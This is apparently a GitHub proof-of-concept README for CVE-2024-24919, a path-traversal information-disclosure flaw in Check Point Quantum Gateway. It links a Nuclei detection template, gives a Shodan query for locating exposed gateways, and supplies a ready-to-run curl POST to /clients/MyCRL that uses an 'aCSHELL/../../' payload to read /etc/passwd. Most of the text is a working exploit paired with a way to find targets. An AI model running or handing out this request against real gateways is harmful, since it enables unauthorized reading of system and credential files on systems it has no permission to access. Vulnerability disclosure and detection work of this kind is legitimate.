# POC CVE-2024-24919
#### Check Point Quantum Gateway - Information Disclosure<br>
#### Nuclei Template : <a href="https://github.com/johnk3r/nuclei-templates/blob/main/http/cves/2024/CVE-2024-24919.yaml">CVE-2024-4919.yaml</a>

#### Shodan : title:"Check Point" || "Server: Check Point SVN" "X-UA-Compatible: IE=EmulateIE7"
#### Exec : curl --path-as-is -i -s -k -X 'POST' -H $'Host: target' -H 'Content-Length: 39' -H 'Connection: keep-alive' --data-binary 'aCSHELL/../../../../../../../etc/passwd' 'https://target.com/clients/MyCRL'
